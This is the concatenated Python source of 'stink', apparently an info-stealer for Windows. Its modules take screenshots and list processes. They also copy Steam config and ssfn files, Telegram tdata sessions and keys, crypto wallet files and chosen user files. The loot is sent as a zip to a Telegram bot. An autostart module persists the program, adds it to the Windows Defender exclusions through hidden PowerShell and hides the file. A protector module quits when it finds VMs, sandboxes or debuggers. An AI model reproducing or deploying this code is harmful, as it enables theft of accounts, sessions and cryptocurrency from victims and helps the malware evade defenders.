        for index in range(int(bytes_needed.value / sizeof(DWORD))):
            process_id = process_ids[index]

            try:

                process_handle = windll.kernel32.OpenProcess(
                    0x0400 | 0x0010, False, process_id
                )
                memory_info = ProcessMemoryCountersEx()
                memory_info.cb = sizeof(ProcessMemoryCountersEx)

                if windll.psapi.GetProcessMemoryInfo(
                    process_handle, byref(memory_info), sizeof(memory_info)
                ):
                    process_name = create_unicode_buffer(512)
                    windll.psapi.GetModuleFileNameExW(
                        process_handle, 0, process_name, sizeof(process_name)
                    )

                    process_list.append(
                        [
                            path.basename(process_name.value),
                            f"{memory_info.WorkingSetSize // mb} MB",
                            process_id,
                        ]
                    )

                windll.kernel32.CloseHandle(process_handle)

            except:
                pass

        return process_list

    def __get_system_processes(self) -> None:
        """
        Collects all running processes.

        Parameters:
        - None.

        Returns:
        - None.
        """
        self.__storage.add_from_memory(
            self.__file,
            "\n".join(
                line
                for line in functions.create_table(
                    ["Name", "Memory", "PID"], self.get_processes_list()
                )
            ),
        )

    def run(self) -> Data:
        """
        Launches the processes collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_system_processes()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Processes]: {repr(e)}")


# Content from stink/stink/modules/screenshot.py
from os import path

from stink.helpers import MemoryStorage, Screencapture
from stink.helpers.dataclasses import Data


class Screenshot:
    """
    Takes a screenshot of the monitors.
    """

    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    def __create_screen(self) -> None:
        """
        Takes a screenshot of the monitors.

        Parameters:
        - None.

        Returns:
        - None.
        """
        capture = Screencapture()
        screenshots = capture.create_in_memory()

        for index, monitor in enumerate(screenshots):
            self.__storage.add_from_memory(
                path.join(self.__folder, f"monitor-{index}.png"), monitor
            )

    def run(self) -> Data:
        """
        Launches the screenshots collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__create_screen()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Screenshot]: {repr(e)}")


# Content from stink/stink/modules/steam.py
from os import listdir, path
from re import findall
from typing import Optional
from winreg import HKEY_LOCAL_MACHINE, KEY_READ, KEY_WOW64_32KEY, OpenKey, QueryValueEx

from stink.helpers import MemoryStorage
from stink.helpers.dataclasses import Data


class Steam:
    """
    Collects configs from the Steam.
    """

    def __init__(self, folder: str):

        self.__folder = folder
        self.__storage = MemoryStorage()

    @staticmethod
    def __get_steam_path() -> Optional[str]:
        """
        Gets the Steam installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Steam installation path if found.
        """
        try:
            key = OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Valve\Steam")
        except FileNotFoundError:
            key = OpenKey(
                HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Valve\Steam",
                0,
                KEY_READ | KEY_WOW64_32KEY,
            )

        value, _ = QueryValueEx(key, "InstallPath")

        if path.exists(value):
            return value

        return None

    def __get_steam_files(self) -> None:
        """
        Collects configs from the Steam.

        Parameters:
        - None.

        Returns:
        - None.
        """
        steam_path = self.__get_steam_path()

        if not steam_path:
            print(f"[Steam]: No Steam found")
            return

        configs = [
            file for file in listdir(rf"{steam_path}\config") if file != "avatarcache"
        ]

        for config in configs:
            self.__storage.add_from_disk(
                path.join(steam_path, "config", config),
                path.join(self.__folder, config),
            )

        ssfns = sum([findall(r"ssfn.*", file) for file in listdir(steam_path)], [])

        for ssfn in ssfns:
            self.__storage.add_from_disk(
                path.join(steam_path, ssfn), path.join(self.__folder, ssfn)
            )

        self.__storage.add_data("Application", "Steam")

    def run(self) -> Data:
        """
        Launches the Steam collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_steam_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Steam]: {repr(e)}")


# Content from stink/stink/modules/system.py
import platform
from ctypes import byref, c_wchar_p, sizeof, windll
from json import loads
from os import path
from string import ascii_uppercase
from urllib.request import urlopen
from winreg import HKEY_LOCAL_MACHINE, OpenKey, QueryValueEx

from stink.helpers import (
    DisplayDevice,
    MemoryStatusEx,
    MemoryStorage,
    UlargeInteger,
    functions,
)
from stink.helpers.config import SystemConfig
from stink.helpers.dataclasses import Data


class System:
    """
    Collects all system data.
    """

    def __init__(self, folder: str):

        self.__file = path.join(folder, "Configuration.txt")
        self.__config = SystemConfig()
        self.__storage = MemoryStorage()

    @staticmethod
    def get_video_card() -> str:
        """
        Gets the video card name.

        Parameters:
        - None.

        Returns:
        - str: Video card name.
        """
        try:

            display_device = DisplayDevice()
            display_device.cb = sizeof(DisplayDevice)

            user32 = windll.user32
            result = user32.EnumDisplayDevicesW(None, 0, byref(display_device), 0)

            if not result:
                return "Unknown"

            return display_device.DeviceString.strip()

        except:
            return "Unknown"

    @staticmethod
    def __get_ram() -> str:
        """
        Gets information about RAM.

        Parameters:
        - None.

        Returns:
        - str: RAM data table.
        """
        try:

            memory_status = MemoryStatusEx()
            memory_status.dwLength = sizeof(memory_status)

            kernel32 = windll.kernel32

            kernel32.GlobalMemoryStatusEx(byref(memory_status))

            total = str(round(memory_status.ullTotalPhys / (1024**3), 2))
            used = str(
                round(
                    (memory_status.ullTotalPhys - memory_status.ullAvailPhys)
                    / (1024**3),
                    2,
                )
            )
            free = str(round(memory_status.ullAvailPhys / (1024**3), 2))

            return "\n".join(
                line
                for line in functions.create_table(
                    ["Used GB", "Free GB", "Total GB"], [[used, free, total]]
                )
            )

        except:
            return "Unknown"

    @staticmethod
    def __get_disks_info() -> str:
        """
        Gets information about disks.

        Parameters:
        - None.

        Returns:
        - str: Disks data table.
        """
        try:

            kernel32 = windll.kernel32

            drives = []
            bitmask = kernel32.GetLogicalDrives()

            for letter in ascii_uppercase:
                if bitmask & 1:
                    drives.append(f"{letter}:\\")
                bitmask >>= 1

            result = []

            for drive in drives:

                total_bytes = UlargeInteger()
                free_bytes = UlargeInteger()
                available_bytes = UlargeInteger()
                success = kernel32.GetDiskFreeSpaceExW(
                    c_wchar_p(drive),
                    byref(available_bytes),
                    byref(total_bytes),
                    byref(free_bytes),
                )

                if not success:
                    continue

                total = ((total_bytes.HighPart * (2**32)) + total_bytes.LowPart) / (
                    1024**3
                )
                free = ((free_bytes.HighPart * (2**32)) + free_bytes.LowPart) / (
                    1024**3
                )
                used = total - free

                result.append([drive, round(used, 2), round(free, 2), round(total, 2)])

            return "\n".join(
                line
                for line in functions.create_table(
                    ["Drive", "Used GB", "Free GB", "Total GB"], result
                )
            )

        except:
            return "Unknown"

    @staticmethod
    def __get_processor_name() -> str:
        """
        Gets the processor name.

        Parameters:
        - None.

        Returns:
        - str: Processor name.
        """
        try:
            return QueryValueEx(
                OpenKey(
                    HKEY_LOCAL_MACHINE,
                    r"HARDWARE\DESCRIPTION\System\CentralProcessor\0",
                ),
                "ProcessorNameString",
            )[0]
        except:
            return "Unknown"

    def __get_ip(self) -> str:
        """
        Gets the IP address.

        Parameters:
        - None.

        Returns:
        - str: IP address.
        """
        try:
            ip = loads(
                urlopen(url=self.__config.IPUrl, timeout=3).read().decode("utf-8")
            )["ip"]
        except:
            ip = "Unknown"

        return ip

    def __get_system_info(self) -> None:
        """
        Collects all system data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        user32 = windll.user32
        data = self.__config.SystemData

        net_info = self.__get_ip()
        machine_type = platform.machine()
        os_info = platform.platform()
        network_name = platform.node()
        cpu_info = self.__get_processor_name()
        gpu_info = self.get_video_card()
        ram_info = self.__get_ram()
        disk_info = self.__get_disks_info()
        monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"

        self.__storage.add_from_memory(
            self.__file,
            data.format(
                self.__config.User,
                net_info,
                machine_type,
                os_info,
                network_name,
                monitors_info,
                cpu_info,
                gpu_info,
                ram_info,
                disk_info,
            ),
        )

        self.__storage.add_data("User", self.__config.User)
        self.__storage.add_data("IP", net_info)
        self.__storage.add_data("OS", os_info)

    def run(self) -> Data:
        """
        Launches the system data collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_system_info()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[System]: {repr(e)}")


# Content from stink/stink/modules/telegram.py
from os import listdir, path
from re import findall
from typing import Optional
from winreg import HKEY_CURRENT_USER, EnumKey, OpenKey, QueryInfoKey, QueryValueEx

from stink.helpers import MemoryStorage
from stink.helpers.config import TelegramConfig
from stink.helpers.dataclasses import Data


class Telegram:
    """
    Collects sessions from the Telegram.
    """

    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = TelegramConfig()
        self.__storage = MemoryStorage()

    def __get_telegram_path(self) -> Optional[str]:
        """
        Gets the Telegram installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Telegram installation path if found.
        """
        if path.exists(self.__config.SessionsPath):
            return self.__config.SessionsPath

        try:
            key = OpenKey(
                HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Uninstall",
            )

            for i in range(QueryInfoKey(key)[0]):

                subkey_name = EnumKey(key, i)
                subkey = OpenKey(key, subkey_name)

                try:
                    display_name = QueryValueEx(subkey, "DisplayName")[0]

                    if "Telegram" not in display_name:
                        continue

                    return QueryValueEx(subkey, "InstallLocation")[0]
                except FileNotFoundError:
                    pass
        except Exception as e:
            print(f"[Telegram]: {repr(e)}")

        return None

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.

        Parameters:
        - None.

        Returns:
        - None.
        """
        telegram_path = self.__get_telegram_path()

        if not telegram_path:
            print(f"[Telegram]: No Telegram found")
            return

        telegram_data = path.join(telegram_path, "tdata")
        sessions = sum(
            [findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)],
            [],
        )

        if not sessions:
            return

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            self.__storage.add_from_disk(
                path.join(telegram_data, session), path.join(self.__folder, session)
            )

        maps = sum(
            [
                findall(r"map.*", file)
                for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))
            ],
            [],
        )

        for map in maps:
            self.__storage.add_from_disk(
                path.join(telegram_data, "D877F783D5D3EF8C", map),
                path.join(self.__folder, "D877F783D5D3EF8C", map),
            )

        self.__storage.add_from_disk(
            path.join(telegram_data, "key_datas"), path.join(self.__folder, "key_datas")
        )

        self.__storage.add_data("Application", "Telegram")

    def run(self) -> Data:
        """
        Launches the Telegram collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_sessions()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Telegram]: {repr(e)}")


# Content from stink/stink/modules/wallets.py
from os import path

from stink.helpers import MemoryStorage
from stink.helpers.config import WalletsConfig
from stink.helpers.dataclasses import Data


class Wallets:
    """
    Collects configs from the crypto wallets.
    """

    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = WalletsConfig()
        self.__storage = MemoryStorage()

    def __get_wallets_files(self) -> None:
        """
        Collects configs from the crypto wallets.

        Parameters:
        - None.

        Returns:
        - None.
        """
        wallets = self.__config.WalletPaths

        for wallet in wallets:

            if not path.exists(wallet["path"]):
                print(f'[Wallets]: No {wallet["name"]} found')
                continue

            self.__storage.add_from_disk(
                wallet["path"], path.join(self.__folder, wallet["name"])
            )
            self.__storage.add_data("Wallet", wallet["name"])

    def run(self) -> Data:
        """
        Launches the crypto wallets collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_wallets_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Wallets]: {repr(e)}")


# Content from stink/stink/senders/telegram.py
from io import BytesIO
from typing import Tuple, Union
from urllib.request import Request, urlopen

from stink.abstract import AbstractSender


class Telegram(AbstractSender):
    """
    Sender for the Telegram.
    """

    def __init__(self, token: str, user_id: int):
        super().__init__()

        self.__token = token
        self.__user_id = user_id
        self.__url = f"https://api.telegram.org/bot{self.__token}/sendDocument"

    def __get_sender_data(self) -> Tuple[Union[str, bytes], ...]:
        """
        Gets data to send.

        Parameters:
        - None.

        Returns:
        - tuple: A tuple of content type, body, and Telegram api url.
        """
        content_type, body = self._encoder.encode(
            [("chat_id", self.__user_id), ("caption", self.__preview)],
            [("document", f"{self.__zip_name}.zip", self.__data)],
        )

        return content_type, body

    def __send_archive(self) -> None:
        """
        Sends the data.

        Parameters:
        - None.

        Returns:
        - None.
        """
        content_type, body = self.__get_sender_data()
        query = Request(method="POST", url=self.__url, data=body)

        query.add_header("User-Agent", self._config.UserAgent)
        query.add_header("Content-Type", content_type)

        urlopen(query)

    def run(self, zip_name: str, data: BytesIO, preview: str) -> None:
        """
        Launches the sender module.

        Parameters:
        - zip_name [str]: Archive name.
        - data [BytesIO]: BytesIO object.
        - preview [str]: Collected data summary.

        Returns:
        - None.
        """
        self.__zip_name = zip_name
        self.__data = data
        self.__preview = preview

        try:

            self._create_unverified_https()
            self.__send_archive()

        except Exception as e:
            print(f"[Telegram sender]: {repr(e)}")


# Content from stink/stink/utils/__init__.py



# Content from stink/stink/utils/autostart.py
from ctypes import windll
from os import path, remove
from shutil import copyfile
from subprocess import CREATE_NEW_CONSOLE, SW_HIDE, Popen

from stink.helpers.config import AutostartConfig


class Autostart:
    """
    Adds the file to autostart.
    """

    def __init__(self, executor_path: str):

        self.__executor_path = executor_path
        self.__config = AutostartConfig()
        self.__autostart_path = path.join(
            self.__config.AutostartPath, f"{self.__config.AutostartName}.exe"
        )

    def __add_to_autostart(self) -> None:
        """
        Creates a copy of the file.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if path.exists(self.__autostart_path):
            remove(self.__autostart_path)

        copyfile(self.__executor_path, self.__autostart_path)

    def __exclude_from_defender(self) -> None:
        """
        Trying to exclude a file from Windows Defender checks.

        Parameters:
        - None.

        Returns:
        - None.
        """
        Popen(
            f"powershell -Command Add-MpPreference -ExclusionPath '{self.__autostart_path}'",
            shell=True,
            creationflags=CREATE_NEW_CONSOLE | SW_HIDE,
        )

    def __hide_file(self) -> None:
        """
        Makes a file hidden.

        Parameters:
        - None.

        Returns:
        - None.
        """
        windll.kernel32.SetFileAttributesW(self.__autostart_path, 2)

    def run(self) -> None:
        """
        Launches the autostart module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__add_to_autostart()
            self.__exclude_from_defender()
            self.__hide_file()

        except Exception as e:
            print(f"[Autostart]: {repr(e)}")


# Content from stink/stink/utils/grabber.py
from os import listdir, path, walk
from typing import List

from stink.helpers import MemoryStorage
from stink.helpers.dataclasses import Data


class Grabber:
    """
    Collects the specified files from the specified paths.
    """

    def __init__(
        self, paths: List[str], file_types: List[str], check_sub_folders: bool = False
    ):

        self.__paths = paths
        self.__file_types = file_types
        self.__check_sub_folders = check_sub_folders

        self.__storage = MemoryStorage()
        self.__folder = "Grabber"

    def __grab_files(self) -> None:
        """
        Collects the specified files from the specified paths.

        Parameters:
        - None.

        Returns:
        - None.
        """
        for item in self.__paths:

            if path.isfile(item):

                if not any(item.endswith(file_type) for file_type in self.__file_types):
                    continue

                self.__storage.add_from_disk(item, path.join(self.__folder, item))
                self.__storage.add_data("Grabber", path.basename(item))

            elif path.isdir(item):

                if self.__check_sub_folders:
                    for folder_name, _, filenames in walk(item):
                        for filename in filenames:

                            if not any(
                                filename.endswith(file_type)
                                for file_type in self.__file_types
                            ):
                                continue

                            self.__storage.add_from_disk(
                                path.join(folder_name, filename),
                                path.join(self.__folder, filename),
                            )
                            self.__storage.add_data("Grabber", filename)
                else:
                    for filename in listdir(item):

                        if not any(
                            filename.endswith(file_type)
                            for file_type in self.__file_types
                        ):
                            continue

                        self.__storage.add_from_disk(
                            path.join(item, filename),
                            path.join(self.__folder, filename),
                        )
                        self.__storage.add_data("Grabber", filename)

    def run(self) -> Data:
        """
        Launches the grabber module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__grab_files()

            return self.__storage.get_data()

        except Exception as e:
            print(f"[Grabber]: {repr(e)}")


# Content from stink/stink/utils/protector.py
from getpass import getuser
from os import getenv, path
from random import choices
from re import findall
from string import ascii_lowercase, ascii_uppercase, digits
from typing import List
from urllib.request import urlopen
from uuid import getnode
from winreg import (
    HKEY_LOCAL_MACHINE,
    KEY_READ,
    EnumKey,
    OpenKey,
    QueryInfoKey,
    QueryValueEx,
)

from stink.enums import Protectors
from stink.helpers.config import ProtectorConfig
from stink.modules import Processes, System


class Protector:
    """
    Protects the script from virtual machines and debugging.
    """

    def __init__(self, protectors: List[Protectors] = None):

        if protectors is None:
            self.__protectors = [Protectors.disable]
        else:
            self.__protectors = protectors

        self.__config = ProtectorConfig()

    @staticmethod
    def __generate_random_string(length: int = 10) -> str:
        """
        Creates a random string.

        Parameters:
        - length [int]: string length.

        Returns:
        - str: Random string.
        """
        return "".join(choices(ascii_uppercase + ascii_lowercase + digits, k=length))

    def __check_processes(self) -> bool:
        """
        Checks processes of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        for process in Processes.get_processes_list():

            if process[0] not in self.__config.Tasks:
                continue

            return True

        return False

    def __check_mac_address(self) -> bool:
        """
        Checks the MAC address of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return (
            ":".join(findall("..", "%012x" % getnode())).lower()
            in self.__config.MacAddresses
        )

    def __check_computer(self) -> bool:
        """
        Checks the name of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return getenv("computername").lower() in self.__config.Computers

    def __check_user(self) -> bool:
        """
        Checks the user of the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        return getuser().lower() in self.__config.Users

    def __check_hosting(self) -> bool:
        """
        Checks if the computer is a server.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:
            return (
                urlopen(url=self.__config.IPUrl, timeout=3)
                .read()
                .decode("utf-8")
                .lower()
                .strip()
                == "true"
            )
        except:
            return False

    def __check_http_simulation(self) -> bool:
        """
        Checks if the user is simulating a fake HTTPS connection.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:
            urlopen(url=f"https://stink-{self.__generate_random_string(20)}", timeout=1)
        except:
            return False
        else:
            return True

    def __check_virtual_machine(self) -> bool:
        """
        Checks whether virtual machine files exist on the computer.

        Parameters:
        - None.

        Returns:
        - bool: True or False.
        """
        try:

            with OpenKey(
                HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Services\Disk\Enum",
                0,
                KEY_READ,
            ) as reg_key:
                value = QueryValueEx(reg_key, "0")[0]

                if any(
                    item.lower() in value.lower()
                    for item in self.__config.RegistryEnums
                ):
                    return True

        except:
            pass

        reg_keys = [
            r"SYSTEM\CurrentControlSet\Enum\IDE",
            r"System\CurrentControlSet\Enum\SCSI",
        ]

        for key in reg_keys:
            try:

                with OpenKey(HKEY_LOCAL_MACHINE, key, 0, KEY_READ) as reg_key:
                    count = QueryInfoKey(reg_key)[0]

                    for item in range(count):

                        if not any(
                            value.lower() in EnumKey(reg_key, item).lower()
                            for value in self.__config.RegistryEnums
                        ):
                            continue

                        return True

            except:
                pass

        if any(item.lower() in System.get_video_card() for item in self.__config.Cards):
            return True

        if any(path.exists(item) for item in self.__config.Dlls):
            return True

        return False

    def run(self) -> None:
        """
        Launches the protector module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        if not self.__protectors or Protectors.disable in self.__protectors:
            return

        try:

            checks = [
                {
                    "method": self.__check_processes,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.processes, Protectors.all]
                    ),
                },
                {
                    "method": self.__check_mac_address,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.mac_address, Protectors.all]
                    ),
                },
                {
                    "method": self.__check_computer,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.computer, Protectors.all]
                    ),
                },
                {
                    "method": self.__check_user,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.user, Protectors.all]
                    ),
                },
                {
                    "method": self.__check_hosting,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.hosting, Protectors.all]
                    ),
                },
                {
                    "method": self.__check_http_simulation,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.http_simulation, Protectors.all]
                    ),
                },
                {
                    "method": self.__check_virtual_machine,
                    "status": any(
                        item in self.__protectors
                        for item in [Protectors.virtual_machine, Protectors.all]
                    ),
                },
            ]

            for check in checks:

                if check["status"] is False:
                    continue

                result = check["method"]()

                if result:
                    exit(0)

        except Exception as e:
            print(f"[Protector]: {repr(e)}")


# Main execution block
if __name__ == '__main__':
    pass  # Add your main execution logic here
